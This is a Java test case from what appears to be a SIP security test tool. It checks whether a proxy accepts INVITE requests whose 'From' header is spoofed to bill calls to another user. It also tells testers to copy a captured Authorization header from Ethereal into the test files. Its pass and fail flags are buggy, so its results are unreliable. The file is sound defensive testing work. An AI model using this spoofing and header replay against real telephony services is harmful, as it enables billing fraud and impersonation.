/*
 * Created on 2005-9-12
 *
 * TODO To change the template for this generated file go to
 * Window - Preferences - Java - Code Style - Code Templates
 */
package testCase;

import mainApp.*;
import helpClass.HelpClass;
import helpClass.LogWriter;
import helpClass.Message;

/**
 * @author Dayong
 * @version 2.9
 * 
 * SIP_Invite_Spoof.java
 * Invite spoofing test case
 * An attacker who is also a registered user, use his ID and password to pass the
 * authentication, and uses another user's ID to make calls for various reasons,
 * such as billing. A commom form of such attack is to spoof the "From" header 
 * field.
 */
public class SIP_Invite_Spoof
{
	//Not Pass - false; Pass - true
    boolean spoof_result_udp = true; 
    boolean spoof_result_tcp = true;  
    
    /*
     * SIPA02X test case
     * In this case, UA1 (Test tool) plays as a hack
     */
    public SIP_Invite_Spoof()
    {
      	if(HelpClass.messaeg_flag)
    	{
    		Message mess = new Message();

    		//register SSTT ddu3 on UDP - SSTT is also a valid register user
    		//SSTT try to spoof other ID and make a call, so first it needs to pass
    		//authentication with REGISTER
         	mess.register("2.0","UDP",HelpClass.ProxyAddress,HelpClass.UA1Address,"E5rSD5sq7Q9sHv7",
         	HelpClass.UA1URL, HelpClass.UA1URL, "1928301774", null, "j8dxkzc9oy11Fx2FTA021", "70",
         	"600", "10100.12", "application/sdp", "0", HelpClass.inv_spo_udp_test_file_s1);
        	//register SSTT ddu3 on TCP
        	mess.register("2.0","TCP",HelpClass.ProxyAddress,HelpClass.UA1Address,"E5rSD5sq7Q9sHv7",
        	HelpClass.UA1URL, HelpClass.UA1URL, "1928301775", null, "j8dxkzc9oy11Fx2FTA022", "70",
        	"600", "10100.12", "application/sdp", "0", HelpClass.inv_spo_tcp_test_file_s1);
    		
    		//register UA2 ddu on UDP - callee (B) 
         	mess.register("2.0","UDP",HelpClass.ProxyAddress,HelpClass.UA2Address,"E5rSD5sq7Q9sHv7",
         	HelpClass.UA2URL, HelpClass.UA2URL, "1928301774", null, "j8dxkzc9oy11Fx2FTA021", "70",
         	"600", "10100.12", "application/sdp", "0", HelpClass.inv_spo_udp_test_file_s2);
        	//register UA2 ddu on TCP - callee (B) 
        	mess.register("2.0","TCP",HelpClass.ProxyAddress,HelpClass.UA2Address,"E5rSD5sq7Q9sHv7",
        	HelpClass.UA2URL, HelpClass.UA2URL, "1928301775", null, "j8dxkzc9oy11Fx2FTA022", "70",
        	"600", "10100.12", "application/sdp", "0", HelpClass.inv_spo_tcp_test_file_s2);
    		
    		//spoofing invite from SSTT/Hack/VUA1 ddu3 to VUA2 ddu on UDP, but "From" field is VUA4
        	//Therefore, billing is charged on VU5 instead VU1/SSTT
        	mess.invite("2.0","UDP",HelpClass.ProxyAddress,HelpClass.UA5Address,"z9hG4bK0553f059c",
			HelpClass.UA2URL, HelpClass.UA5URL, "ff7577f256d0df6", "9103", "timer", "3600", "7547f946d5a9ca8",
			"INVITE,ACK,OPTIONS,BYE,CANCEL,REGISTER,REFER,SUBSCRIBE,NOTIFY,MESSAGE", "70",
			null, "application/sdp", "0", HelpClass.UA5URL, HelpClass.UA5Address,
			HelpClass.UA2URL, "sdp", HelpClass.inv_spo_udp_test_file_s3);	
        	
        	//modified invite from SSTT/Hack/VUA1 ddu3 to VUA2 ddu on TCP, but "From" field is VUA4
        	//Therefore, billing is charged on VU5 instead VU1/SSTT
        	mess.invite("2.0","TCP",HelpClass.ProxyAddress,HelpClass.UA5Address,"z9hG4bK4058649c0",
			HelpClass.UA2URL, HelpClass.UA5URL, "ff7577f256d0df7", "9113", "timer", "3600", "7547f946d5a9ca9",
			"INVITE,ACK,OPTIONS,BYE,CANCEL,REGISTER,REFER,SUBSCRIBE,NOTIFY,MESSAGE", "70",
			null, "application/sdp", "0", HelpClass.UA5URL, HelpClass.UA5Address,
			HelpClass.UA2URL, "sdp", HelpClass.inv_spo_tcp_test_file_s3);	
    	}
    	
    	if(HelpClass.test_udp_flag) 
    	{
    		this.spoofUDP();
    	}
        if(HelpClass.test_tcp_flag) 
        {
        	this.spoofTCP();
        }
    }
    
    public void spoofUDP()
    {
    	HelpClass.debug("");
    	System.out.println("No.SIPA021-INVITE Request Spoofing Test on UDP Begin ...");
    	UdpBase udpbase = new UdpBase();
    	//Register target user - A
    	HelpClass.debug("----->1.Register VUA1/SSTT to pass authentication if possible - Caller");
    	String receive = udpbase.sendReceiveMessage(HelpClass.inv_spo_udp_test_file_s1);
    	if (receive == null || receive.indexOf("401 Unauthorized")>=0 || 
    		receive.indexOf("407 Proxy Authentication")>=0)
        {
        	this.spoof_result_udp = true;
        	HelpClass.debug("----->Info:Unauthorized; Authentication Needed.");
            this.authentication();
            return;
        }
    	
    	if ((receive != null)&& receive.indexOf("401 Unauthorized")==-1 &&
    	     receive.indexOf("407 Proxy Authentication")==-1 && receive.indexOf("200 OK")>=0 ) 
        {
    		//Register a virtual user/UA - B
    		HelpClass.debug("----->Info:Sucess");
    		HelpClass.debug("----->2.Register UA2 B - Callee");
    		String receive2 = udpbase.sendReceiveMessage(HelpClass.inv_spo_udp_test_file_s2);
    		if (receive2.indexOf("200 OK")==-1 ) 
    		{	
    			HelpClass.debug("----->Info:Fail");
    			this.authentication();
    			return;
    		}
    	    
    	    HelpClass.debug("----->3.Spoofing INVITE from UA5 to B which actually from SSTT");
    	    String receive3 = udpbase.sendReceiveMessage(HelpClass.inv_spo_udp_test_file_s3);
    	    if(receive3 == null || receive3.indexOf("404 Not Found") >= 0) 
    		{
    	    	this.spoof_result_udp = true;
    	    	System.out.println("No.SIPA021 Test: Pass-INVITE Request Spoofing Attack on UDP " +
    	    			"CANNOT Be Launched ...");
    	    	LogWriter.log("No.SIPA021 Test: Pass-INVITE Request Spoofing Attack on UDP CANNOT " +
    	    			"Be Launched");
    		}
    	    else
    	    {
    	    	this.spoof_result_udp = true;
    	    	System.out.println("No.SIPA021 Test: Fail-INVITE Request Spoofing Attack on UDP " +
    	    			"Can Be Launched ...");
    	    	LogWriter.log("No.SIPA021 Test: Fail-INVITE Request Spoofing Attack on UDP Can Be " +
    	    			"Launched");
    	    }
        }
    	
    }
    
    public void spoofTCP()
    {
    	HelpClass.debug("");
    	System.out.println("No.SIPA022-INVITE Request Spoofing Attack on TCP Begin ...");
    	TcpBase tcpbase = new TcpBase();
    	//Register target user - A
    	HelpClass.debug("----->1.Register VUA1/SSTT to pass authentication if possible - Caller");
    	String receive = tcpbase.sendReceiveMessage(HelpClass.inv_spo_tcp_test_file_s1);
    	if (receive == null || receive.indexOf("401 Unauthorized")>=0 || 
    		receive.indexOf("407 Proxy Authentication")>=0)
        {
        	this.spoof_result_udp = true;
        	HelpClass.debug("----->Info:Unauthorized; Authentication Needed.");
            this.authentication();
            return;
        }
    	
    	if ((receive != null)&& receive.indexOf("401 Unauthorized")==-1 &&
    	     receive.indexOf("407 Proxy Authentication")==-1 && receive.indexOf("200 OK")>=0 ) 
        {
    		//Register a virtual user/UA - B
    		HelpClass.debug("----->Info:Sucess");
    		HelpClass.debug("----->2.Register UA2 B - Callee");
    		String receive2 = tcpbase.sendReceiveMessage(HelpClass.inv_spo_tcp_test_file_s2);
    		if (receive2.indexOf("200 OK")==-1 ) 
    		{	
    			HelpClass.debug("----->Info:Fail");
    			this.authentication();
    			return;
    		}
    	    
    	    HelpClass.debug("----->3.Spoofing INVITE from UA5 to B which actually from SSTT");
    	    String receive3 = tcpbase.sendReceiveMessage(HelpClass.inv_spo_tcp_test_file_s3);
    	    if(receive3 == null || receive3.indexOf("404 Not Found") >= 0) 
    		{
    	    	this.spoof_result_udp = true;
    	    	System.out.println("No.SIPA022 Test: Pass-INVITE Request Spoofing Attack on TCP CANNOT Be Launched ...");
    	    	LogWriter.log("No.SIPA022 Test: Pass-INVITE Request Spoofing Attack on TCP CANNOT Be Launched");
    		}
    	    else
    	    {
    	    	this.spoof_result_udp = true;
    	    	System.out.println("No.SIPA022 Test: Fail-INVITE Request Spoofing Attack on TCP Can Be Launched ...");
    	    	LogWriter.log("No.SIPA022 Test: Fail-INVITE Request Spoofing Attack on TCP Can Be Launched");
    	    }
        }
    	tcpbase.clearSocket();
    	
    }
    
    public void authentication()
    {
    	System.out.println("NOTE:");
    	System.out.println("For futher test, authentication information is needed " +
    			"following the steps below.");
    	System.out.println("1. Check SIP REGISTER message in Ethereal.");
    	System.out.println("2. Find the field 'Authorization' and copy.");
    	System.out.println("3. Paste to the REGISTER messages in all files in TestFile\\SIPA021" +
    			"TestFile\\SIPA022 folder.");
    	System.out.println("4. Restart test.");
    }
}
